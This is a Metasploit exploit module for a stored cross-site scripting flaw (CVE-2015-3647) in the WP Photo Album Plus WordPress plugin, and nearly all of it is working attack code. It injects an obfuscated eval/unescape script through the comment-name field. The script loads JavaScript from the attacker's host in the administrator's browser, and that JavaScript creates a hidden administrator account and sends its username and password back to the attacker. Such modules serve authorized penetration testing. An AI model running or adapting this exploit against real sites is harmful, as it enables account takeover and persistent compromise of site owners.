##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WP Photo Album Plus 6.1.2 Stored XSS',
      'Description'     => %q(
        The vulnerability exists due to the absence of filtration of user-supplied
        input passed via the "comname" and "comemail" HTTP POST parameters to
        "/wp-content/plugins/wp-photo-album-plus/wppa-ajax-front.php" script when
        posting a comment.

        A remote attacker can post a specially crafted message containing malicious
        HTML or script code and execute it in administrator's browser in context of
        the vulnerable website, when administrator views images or comments in
        administrative interface.
      ),
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'High-Tech Bridge Security Research Lab',   # Discovery and disclosure
          'Rob Carr <rob[at]rastating.com>'           # Metasploit module
        ],
      'References'      =>
        [
          ['CVE', '2015-3647'],
          ['WPVDB', '7996'],
          ['URL', 'https://www.htbridge.com/advisory/HTB23257']
        ],
      'DisclosureDate'  => 'May 20 2015',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['WordPress', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('LHOST',  [true, 'The host address to access via the stored XSS', '']),
        OptString.new('URIPATH', [false, 'The URI to use for this exploit', ''])
      ], self.class)
  end

  def script
    # Due to WordPress escaping the quotation marks, the script must be escaped and stored
    # as a regular expression, and then executed using eval after being unescaped. The
    # forward slashes of the URL also have to be individually encoded using encodeURIComponent()
    # as we can't simply escape them with a back slash, or the backslash will appear in the
    # string that we unescape and execute.

    # Unescaped script: var a = document.createElement("script");a.setAttribute("src", decodeURIComponent("http%3A%2F%2F#{datastore['LHOST']}%3A#{datastore['SRVPORT']}%2F#{datastore['URIPATH']}"));document.head.appendChild(a);
    "eval(unescape(/var%20a%20%3D%20document.createElement%28%22script%22%29%3Ba.setAttribute%28%22src%22%2C%20decodeURIComponent%28%22http%253A%252F%252F#{datastore['LHOST']}%253A#{datastore['SRVPORT']}%252F#{datastore['URIPATH']}%22%29%29%3Bdocument.head.appendChild%28a%29%3B/.source))"
  end

  def ajax_url
    normalize_uri(wordpress_url_plugins, 'wp-photo-album-plus', 'wppa-ajax-front.php')
  end

  def check
    check_plugin_version_from_readme('wp-photo-album-plus', '6.1.3')
  end

  def exploit
    super
  end

  def primer
    print_status("#{peer} - Storing script...")
    vprint_status(script)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => ajax_url,
      'vars_post' => {
        'action'      => 'wppa',
        'wppa-action' => 'do-comment',
        'photo-id'    => Rex::Text.rand_text_numeric(3),
        'comment'     => Rex::Text.rand_text_alpha(50),
        'comemail'    => "#{Rex::Text.rand_text_alpha(10)}@#{Rex::Text.rand_text_alpha(10)}.com",
        'comname'     => "#{Rex::Text.rand_text_alpha(8)}<script>#{script}</script>"
      }
    )
    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200

    print_good("#{peer} - Script stored and will be executed upon visiting /wp-admin/admin.php?page=wppa_manage_comments")
  end

  def wordpress_js_create_user
    username = Rex::Text.rand_text_alpha(6)
    password = Rex::Text.rand_text_alpha(10)

    %Q|
      #{js_ajax_download}
      #{js_ajax_post}

      var create_user = function () {
        var nonce = this.responseText.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];
        var data = new FormData();

        data.append('action', 'createuser');
        data.append('_wpnonce_create-user', nonce);
        data.append('_wp_http_referer', '#{wordpress_url_new_user}');
        data.append('user_login', '#{username}');
        data.append('email', '#{Rex::Text.rand_text_alpha(7)}@#{Rex::Text.rand_text_alpha(10)}.com');
        data.append('pass1', '#{password}');
        data.append('pass2', '#{password}');
        data.append('role', 'administrator');

        postInfo("#{wordpress_url_new_user}", data, function () {
          var a = document.createElement("script");
          a.setAttribute("src", "http://#{datastore['LHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}?u=#{username}&p=#{password}");
          document.head.appendChild(a);
        });
      };

      ajax_download({
        path: "#{wordpress_url_new_user}",
        cb: create_user
      });
    |
  end

  def on_request_uri(cli, request)
    if request.qstring['u'] && request.qstring['p']
      print_good("#{peer} - created a new administrator user, #{request.qstring['u']}:#{request.qstring['p']}")
      html = ''
    else
      html = wordpress_js_create_user
      print_good("#{peer} - serving JavaScript")
    end

    send_response(cli, html)
  end
end
